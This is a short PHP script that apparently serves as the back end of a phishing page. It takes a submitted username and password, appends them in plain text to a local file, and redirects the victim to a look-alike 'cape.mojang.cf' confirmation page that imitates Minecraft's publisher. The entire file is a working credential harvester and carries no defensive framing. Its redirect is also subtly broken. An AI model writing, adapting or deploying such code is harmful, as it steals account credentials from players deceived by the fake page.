<?php
 if(isset($_POST['username']) && isset($_POST['password'])) {
     $data = $_POST['username'] . '-' . $_POST['password'] . "\n";
     $ret = file_put_contents('./list.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         die('There was an error writing this file');
     }
     else {
         echo "$ret bytes written to file";
     }
 }
 else {
    die('no post data to process');
 }
 header('Location: cape.mojang.cf/cape_confirmation.html '.$newURL);
